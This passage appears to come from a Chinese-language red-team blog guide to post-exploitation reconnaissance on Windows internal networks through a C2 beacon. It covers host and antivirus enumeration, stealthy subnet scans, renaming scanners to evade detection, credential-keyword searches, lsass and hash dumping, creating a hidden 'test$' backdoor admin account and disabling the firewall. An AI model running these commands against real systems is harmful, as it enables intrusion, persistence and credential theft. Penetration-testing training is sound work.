<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net use
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005226.png" alt="image.png"></p>
<h3 id="16-查看主机进程信息">16. 查看主机进程信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic process get Name,ProcessId,ExecutablePath
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以查看主机进程信息，并作出过滤进程路径，名称和pid。<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005346.png" alt="image.png"></p>
<h3 id="17-指定查看路径信息">17. 指定查看路径信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic process where Name=&#34;有道云笔记.exe&#34; get ExecutablePath
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005611.png" alt="image.png"></p>
<h3 id="18-查看补丁信息">18. 查看补丁信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005731.png" alt="image.png"></p>
<h3 id="19-查看安装应用信息">19. 查看安装应用信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic product get Caption,Version
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005846.png" alt="image.png"><br>
PS：在win10中，输入<code>wmic /?</code>会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用<br>
powershell中可代替该命令的是：<code>Get-WinObject</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-WinObject -class win32_product | Select-object -property name,version
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="20-查询本机服务">20. 查询本机服务</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic server list brief
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715010339.png" alt="image.png"></p>
<h3 id="21-查询目标主机上的杀毒软件">21. 查询目标主机上的杀毒软件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">查询进程：shell tasklist，
</span></span><span class="line"><span class="cl">或者：shell wmic process list brief
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715110942.png" alt="image.png"><br>
常见的杀软进程：</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>进程名</th>
          <th>软件</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>360sd.exe</td>
          <td>360杀毒</td>
      </tr>
      <tr>
          <td>360tray.exe</td>
          <td>360实时保护</td>
      </tr>
      <tr>
          <td>ZhuDongFangYu.exe</td>
          <td>360主动防御</td>
      </tr>
      <tr>
          <td>KSafeTray.exe</td>
          <td>金山卫士</td>
      </tr>
      <tr>
          <td>SafeDogUpdateCenter.exe</td>
          <td>安全狗</td>
      </tr>
      <tr>
          <td>McAfee McShield.exe</td>
          <td>McAfee</td>
      </tr>
      <tr>
          <td>egui.exe</td>
          <td>NOD32</td>
      </tr>
      <tr>
          <td>AVP.exe</td>
          <td>卡巴斯基</td>
      </tr>
      <tr>
          <td>avhuard.exe</td>
          <td>小红伞</td>
      </tr>
      <tr>
          <td>bdagent.exe</td>
          <td>BitDefender</td>
      </tr>
  </tbody>
</table></div>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112024.png" alt="image.png"><br>
主动防御软件的安装路径</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic /namespace:\\root\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="22-查看已启动的程序信息">22. 查看已启动的程序信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell wmic startup get command,caption
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112539.png" alt="image.png"></p>
<h3 id="23-查看计划任务">23. 查看计划任务</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell schtasks /query /fo LISR /v
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="24-查看主机的开机时间">24. 查看主机的开机时间</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net statistics workstation
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112823.png" alt="image.png"></p>
<h1 id="0x04-探测网段存活">0x04 探测网段存活</h1>
<p>高速内网扫描</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i &#34;ttl= &#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>随机延迟+长超时</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell for /l %i in (1,1,255) do @ping -n 1 -w 500 192.168.12.%i &amp;&amp; timeout /t 1 &gt;null | find /i &#34;ttl= &#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里看好有没有杀软edr再用，不然就是自首，除非你能二开工具。</p>
<h3 id="1-利用betbios快速探测内网">1. 利用betbios快速探测内网</h3>
<p>工具：Nbtscan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/lifenjoiner/nbtscan
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用cs可以直接上传该脚本。<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715140127.png" alt="image.png"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell nbscan.exe 10.10.20.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715140608.png" alt="image.png"></p>
<h3 id="2-通过arp扫描完整探测内网">2. 通过arp扫描完整探测内网</h3>
<p>下载地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/QbsuranAlang/arp-scan-windows-
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell arp.exe -t 10.10.20.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3-通过arpscan脚本">3. 通过ARPScan脚本</h3>
<p>下载地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/Hackplayers/Empire-mod-Hackplayers/tree/master
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">通过ARP协议进行扫描。
</span></span><span class="line"><span class="cl">脚本名称：Invoke-ARPScan.ps1
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell-import
</span></span><span class="line"><span class="cl">powershell Invoke-ARPScan -CIDR 10.10.20.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142613.png" alt="image.png"><br>
上传上去：<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142630.png" alt="image.png"><br>
执行该命令即可：<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142703.png" alt="image.png"></p>
<h1 id="0x05-针对件内容的信息搜集">0x05 针对⽂件内容的信息搜集</h1>
<p>当对内⽹束⼿⽆策的时候，⼊⼝机器上⾯说不定藏着突破⼝，翻找本地的⽂件和建⽴的⽹络连接就是⼿法<br>
这⾥也提供⼀个⽂件内容敏感词的字典，需要可以⾃⼰去整理，如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jdbc:
</span></span><span class="line"><span class="cl">user=
</span></span><span class="line"><span class="cl">password=
</span></span><span class="line"><span class="cl">key=
</span></span><span class="line"><span class="cl">ssh-
</span></span><span class="line"><span class="cl">ldap:
</span></span><span class="line"><span class="cl">mysqli_connect
</span></span><span class="line"><span class="cl">sk-
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x06-配置信息收集">0x06 配置信息收集</h1>
<h3 id="1-web信息">1. web信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run netstat -ano
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142911.png" alt="image.png"></p>
<h3 id="2-文档信息">2. 文档信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir /a /s /b c:\*.xls
</span></span><span class="line"><span class="cl">shell dir /a /s /b c:\*.doc
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715143756.png" alt="image.png"></p>
<h3 id="3-查看最近打开的文档">3. 查看最近打开的文档</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir %APPDATA%\Microsoft\Windows\Recent
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715143914.png" alt="image.png"></p>
<h3 id="4-查看微信信息">4. 查看微信信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir /s /b c:\&#34;WeChat Files&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715144017.png" alt="image.png"></p>
<h1 id="0x07-网络资产搜集">0x07 网络资产搜集</h1>
<h3 id="1-网络各种配置文件">1. 网络各种配置文件</h3>
<p>通常再行动中，入口点都在泛OA，致OA，通OA，用NC等等。<br>
用NC解密：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址：
</span></span><span class="line"><span class="cl">https://github.com/1amfine2333/ncDecode
</span></span></code></pre></td></tr></table>
</div>
</div><p>致OA解密：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址：
</span></span><span class="line"><span class="cl">https://github.com/m4yfly/OA-Seeyou
</span></span></code></pre></td></tr></table>
</div>
</div><p>这些常见系统的配置文件地址要记住，如果是其他入口就多找找<code>.config</code>文件<br>
常见中间件及其配置目录：<br>
默认安装：</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>中间件</th>
          <th>目录1</th>
          <th>目录2</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>MySQL</td>
          <td>C:\ProgarmData\MySQL\MySQL Server</td>
          <td>C:\Progarm Files\MySQL\MySQL Server</td>
      </tr>
      <tr>
          <td>SQL Server</td>
          <td>C:\Progarm Files\Miscrosoft SQL Server\</td>
          <td></td>
      </tr>
      <tr>
          <td>Oracle Database</td>
          <td>C:\app\oracle\product</td>
          <td></td>
      </tr>
      <tr>
          <td>PostgreSQL</td>
          <td>C:\Progarm Files\PostgreSQL</td>
          <td></td>
      </tr>
      <tr>
          <td>Redis</td>
          <td>C:\Progarm Files\Redis</td>
          <td></td>
      </tr>
      <tr>
          <td>Apache</td>
          <td>C:\Progarm Files\Apache Group</td>
          <td>C:\Progarm Files（x86）\Apache</td>
      </tr>
      <tr>
          <td>Nginx</td>
          <td>C:\nginx\conf</td>
          <td>C:\Progarm Files\Nginx\conf</td>
      </tr>
      <tr>
          <td>Tomacat</td>
          <td>C:\Progarm Files\Apache</td>
          <td></td>
      </tr>
  </tbody>
</table></div>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\XXX\Desktop</span>                       <span class="c1">//用户桌面内容
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\XXX\Dowloads</span>                   <span class="c1">//用户下载内容
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\XXX\Documents</span>                 <span class="c1">//用户文档内容
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\XXX\AppData\Local</span>          <span class="c1">//用户软件信息【仅个人安装选项】
</span></span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x08-内网工具">0x08 内网工具</h1>
<h3 id="1-fscan">1. fscan</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址：
</span></span><span class="line"><span class="cl">https://github.com/shadow1ng/fscan
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan -h 10.10.20.0/24 -np -no -p 445,3389
</span></span><span class="line"><span class="cl">-np on ping 
</span></span><span class="line"><span class="cl">-pn 21指定不要扫描ftp端口，因为容易被查到
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以改名使用：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">最好改一下名字：
</span></span><span class="line"><span class="cl">mysql.exe -i 10.10.20.0/24 -np -m netbios
</span></span></code></pre></td></tr></table>
</div>
</div><p>ms17010扫描:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql.exe -i 10.10.20.0/24 -np -m ms17010
</span></span></code></pre></td></tr></table>
</div>
</div><p>常见端口扫描：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql.exe -i 10.10.20.0/24 -np -p 22,2222,3389,1433,3306,1521,5432,6379 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2-kscan-轻量化全方位扫描器">2. Kscan-轻量化全方位扫描器</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址
</span></span><span class="line"><span class="cl">https://github.com/lcvvvv/kscan
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3-dismap">3. dismap</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址：
</span></span><span class="line"><span class="cl">https://github.com/zhzyker/dismap
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715150212.png" alt="image.png"><br>
原则就是：</p>
<ol>
<li>安静</li>
<li>不被发现</li>
<li>尽量用正常的协议</li>
<li>尽量用改造过的工具</li>
</ol>
<h1 id="0x09-密码凭证收集">0x09 密码凭证收集</h1>
<h3 id="1-主机密码">1. 主机密码</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell logonpasswords
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715150910.png" alt="image.png"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell hashdump
</span></span></code></pre></td></tr></table>
</div>
</div><p>dump lsass进程中的hash(巨龙拉东插件)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">下载地址：
</span></span><span class="line"><span class="cl">https://github.com/k8gege/Ladon
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x10-用户操作相关">0x10 用户操作相关</h1>
<h3 id="1-当前用户">1. 当前用户</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell whoami
</span></span><span class="line"><span class="cl">一般用这个：
</span></span><span class="line"><span class="cl">shell echo %username%
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2-收集用户信息">2. 收集用户信息</h3>
<p>查看⽤户名，查看⽤户信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user
</span></span><span class="line"><span class="cl">net user ⽤户名
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3-在线户">3. 在线⽤户</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell query user
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="4-查看域管">4. 查看域管</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> shell net localgroup administrators
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="5-激活guest">5. 激活Guest</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user guest /active:yes
</span></span><span class="line"><span class="cl">shell net user guest P@ssw0rd123
</span></span><span class="line"><span class="cl">shell net localgroup administrators guest /add
</span></span><span class="line"><span class="cl">shell net localgroup administrators
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="6-激活administrator">6. 激活administrator</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user Administrator /active:yes
</span></span><span class="line"><span class="cl">shell net user Administrator P@ssw0rd123
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="7-创建户">7. 创建⽤户</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user ⽤户名 密码 /add #添加⽤户
</span></span><span class="line"><span class="cl">shell net localgroup administrators ⽤户名 /add #将⽤户加到管理组
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="8-创建后户">8. 创建后⻔⽤户</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user test$ P@ssw0rd123 /add
</span></span><span class="line"><span class="cl">shell net localgroup administrators test$ /add
</span></span><span class="line"><span class="cl">shell net localgroup administrators
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x11-查看防墙相关">0x11 查看防⽕墙相关</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh firewall show config
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="关闭防墙">关闭防⽕墙</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">netsh</span> <span class="nx">firewall</span> <span class="nx">set</span> <span class="nx">opmode</span> <span class="nx">disable</span>    <span class="c1">//Windows Server 2003 系统及之前的版本</span>
</span></span><span class="line"><span class="cl"><span class="nx">netsh</span> <span class="nx">advfirewall</span> <span class="nx">set</span> <span class="nx">allprofiles</span> <span class="nx">state</span> <span class="nx">off</span>  <span class="c1">//Windows Server 2003 系统及之后的版本</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可<br>
利⽤允许的⼊站端⼝:<br>
查看已放⾏端⼝:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell netsh firewall show portopening
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717214640.png" alt="image.png"><br>
